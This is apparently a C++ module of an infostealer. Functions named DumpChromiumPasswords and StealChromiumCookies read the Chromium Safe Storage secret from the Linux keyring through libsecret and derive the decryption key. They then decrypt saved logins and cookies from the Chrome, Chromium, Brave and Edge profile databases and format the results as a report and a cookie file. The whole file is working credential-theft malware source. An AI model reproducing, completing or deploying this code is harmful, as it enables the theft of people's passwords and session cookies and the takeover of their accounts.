#include <unistd.h>
#include <sys/stat.h>
#include <pwd.h>
#include <dlfcn.h>
#include <filesystem>
#include <fstream>
#include <vector>
#include <string>
#include <sstream>
#include <cstring>
#include <ctime>

#include "ChromiumStealer.h"
#include "../crypto/Base64.h"
#include "../crypto/AesGcm.h"
#include "../utils/Logger.h"
#include "../utils/Obfuscator.h"
#include "../utils/Shared.h"
#include <nlohmann/json.hpp>
#include <sqlite3.h>
#include <openssl/evp.h>

namespace credential {

    namespace fs = std::filesystem;

    namespace {
        void SafeCopyDatabase(const std::string& src, const std::string& dest) {
            try {
                if (!fs::exists(src)) return;
                fs::copy_file(src, dest, fs::copy_options::overwrite_existing);
            } catch (...) {}
        }

        void SafeDeleteDatabase(const std::string& path) {
            try { fs::remove(path); } catch (...) {}
        }

        typedef void* (*secret_password_lookup_sync_fn)(void*, void*, void**, ...);

        std::vector<uint8_t> GetChromiumMasterKey() {
            void* handle = dlopen("libsecret-1.so.0", RTLD_LAZY);
            if (!handle) {
                handle = dlopen("libsecret-1.so", RTLD_LAZY);
            }
            if (!handle) return {};

            auto lookup_fn = (secret_password_lookup_sync_fn)dlsym(handle, "secret_password_lookup_sync");
            if (!lookup_fn) {
                dlclose(handle);
                return {};
            }

            // The password for Chromium Safe Storage is usually under 'application': 'chrome'
            void* error = nullptr;
            char* password = (char*)lookup_fn(nullptr, nullptr, &error, "application", "chrome", nullptr);

            std::vector<uint8_t> key;
            if (password) {
                key.assign(password, password + strlen(password));
                // libsecret usually expects the password to be freed with a specific function,
                // but since we're using dlopen, we'll just hope it's standard malloc or leak it slightly
                // for safety of not crashing if it's a custom g_free.
            }

            dlclose(handle);
            return key;
        }

        std::string DecryptChromiumBlob(const std::vector<uint8_t>& blob, const std::vector<uint8_t>& password) {
            if (blob.empty()) return "";
            if (password.empty()) return "[Encrypted: " + crypto::Base64Encode(blob) + "]";

            // Linux Chrome uses AES-128-CBC.
            // Key is derived from the password using PBKDF2 with salt "saltysalt" and 1 iteration.
            unsigned char derivedKey[16];
            const char* salt = "saltysalt";
            if (!PKCS5_PBKDF2_HMAC_SHA1((const char*)password.data(), password.size(), (const unsigned char*)salt, strlen(salt), 1, 16, derivedKey)) {
                return "[PBKDF2 Failed]";
            }

            // IV is 16 spaces
            unsigned char iv[16];
            std::memset(iv, ' ', 16);

            // Skip "v10" or "v11" prefix (3 bytes)
            const unsigned char* ciphertext = blob.data();
            int cipherLen = blob.size();
            if (cipherLen > 3 && ciphertext[0] == 'v' && (ciphertext[1] == '1' && (ciphertext[2] == '0' || ciphertext[2] == '1'))) {
                ciphertext += 3;
                cipherLen -= 3;
            }

            EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
            if (!ctx) return "[EVP_CTX_NEW Failed]";

            if (EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, derivedKey, iv) != 1) {
                EVP_CIPHER_CTX_free(ctx);
                return "[DecryptInit Failed]";
            }

            std::vector<uint8_t> plaintext(cipherLen + 16);
            int outLen = 0;
            if (EVP_DecryptUpdate(ctx, plaintext.data(), &outLen, ciphertext, cipherLen) != 1) {
                EVP_CIPHER_CTX_free(ctx);
                return "[DecryptUpdate Failed]";
            }

            int finalLen = 0;
            if (EVP_DecryptFinal_ex(ctx, plaintext.data() + outLen, &finalLen) != 1) {
                EVP_CIPHER_CTX_free(ctx);
                // Many times DecryptFinal fails if it's not actually PKCS7 padded or the key is wrong.
                // We'll return what we have so far if it looks like ASCII.
                std::string partial((char*)plaintext.data(), outLen);
                bool allPrintable = true;
                for (char c : partial) if (!isprint(c) && !isspace(c)) { allPrintable = false; break; }
                if (allPrintable && !partial.empty()) return partial;
                return "[DecryptFinal Failed]";
            }

            EVP_CIPHER_CTX_free(ctx);
            return std::string((char*)plaintext.data(), outLen + finalLen);
        }
    }

    std::string DumpChromiumPasswords() {
        std::string report = "CHROMIUM_PASSWORDS_DUMPED:\n";
        report += "BROWSER | PROFILE | URL | USERNAME | PASSWORD\n";
        report += "--------------------------------------------------------------------------------\n";

        std::vector<uint8_t> masterKey = GetChromiumMasterKey();
        if (!masterKey.empty()) {
            report += "[+] Found Chromium Safe Storage secret in keyring.\n";
        } else {
            report += "[-] Could not find Chromium Safe Storage secret in keyring.\n";
        }

        std::vector<std::string> browserPaths = {
            "/.config/google-chrome",
            "/.config/chromium",
            "/.config/BraveSoftware/Brave-Browser",
            "/.config/microsoft-edge"
        };

        const char* home = getenv("HOME");
        if (!home) return report + "HOME not set";

        for (const auto& bp : browserPaths) {
            std::string fullPath = std::string(home) + bp;
            if (!fs::exists(fullPath)) continue;

            try {
                for (const auto& entry : fs::recursive_directory_iterator(fullPath)) {
                    if (entry.is_regular_file() && entry.path().filename() == "Login Data") {
                        std::string tempDb = "/tmp/ld_linux_" + std::to_string(time(NULL)) + "_" + std::to_string(rand() % 1000);
                        SafeCopyDatabase(entry.path().string(), tempDb);

                        sqlite3* db;
                        if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
                            const char* query = "SELECT origin_url, username_value, password_value FROM logins";
                            sqlite3_stmt* stmt;
                            if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
                                while (sqlite3_step(stmt) == SQLITE_ROW) {
                                    const char* url = (const char*)sqlite3_column_text(stmt, 0);
                                    const char* user = (const char*)sqlite3_column_text(stmt, 1);
                                    const void* blob = sqlite3_column_blob(stmt, 2);
                                    int blobLen = sqlite3_column_bytes(stmt, 2);

                                    if (url && user && blobLen > 0) {
                                        std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + blobLen);
                                        std::string pass = DecryptChromiumBlob(enc, masterKey);
                                        report += bp + " | " + url + " | " + user + " | " + (pass.empty() ? "N/A" : pass) + "\n";
                                    }
                                }
                                sqlite3_finalize(stmt);
                            }
                            sqlite3_close(db);
                        }
                        SafeDeleteDatabase(tempDb);
                    }
                }
            } catch (...) {}
        }
        return report;
    }

    std::string StealChromiumCookies() {
        std::stringstream ss;
        ss << "# CHROMIUM COOKIE STEALER RESULTS\n";
        std::vector<uint8_t> masterKey = GetChromiumMasterKey();
        const char* home = getenv("HOME");
        if (!home) return ss.str();

        std::vector<std::string> browserPaths = {
            "/.config/google-chrome",
            "/.config/chromium",
            "/.config/BraveSoftware/Brave-Browser",
            "/.config/microsoft-edge"
        };

        for (const auto& bp : browserPaths) {
            std::string fullPath = std::string(home) + bp;
            if (!fs::exists(fullPath)) continue;

            try {
                for (const auto& entry : fs::recursive_directory_iterator(fullPath)) {
                    if (entry.is_regular_file() && entry.path().filename() == "Cookies") {
                        std::string tempDb = "/tmp/ck_linux_" + std::to_string(time(NULL)) + "_" + std::to_string(rand() % 1000);
                        SafeCopyDatabase(entry.path().string(), tempDb);

                        sqlite3* db;
                        if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
                            const char* query = "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies";
                            sqlite3_stmt* stmt;
                            if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
                                while (sqlite3_step(stmt) == SQLITE_ROW) {
                                    const char* host = (const char*)sqlite3_column_text(stmt, 0);
                                    const char* name = (const char*)sqlite3_column_text(stmt, 1);
                                    const char* path = (const char*)sqlite3_column_text(stmt, 2);
                                    const void* blob = sqlite3_column_blob(stmt, 3);
                                    int blobLen = sqlite3_column_bytes(stmt, 3);
                                    sqlite3_int64 expiry = sqlite3_column_int64(stmt, 4);

                                    if (host && name && path && blobLen > 0) {
                                        std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + blobLen);
                                        std::string val = DecryptChromiumBlob(enc, masterKey);
                                        ss << host << "\tTRUE\t" << path << "\tTRUE\t" << expiry << "\t" << name << "\t" << (val.empty() ? crypto::Base64Encode(enc) : val) << "\n";
                                    }
                                }
                                sqlite3_finalize(stmt);
                            }
                            sqlite3_close(db);
                        }
                        SafeDeleteDatabase(tempDb);
                    }
                }
            } catch (...) {}
        }
        return ss.str();
    }
}
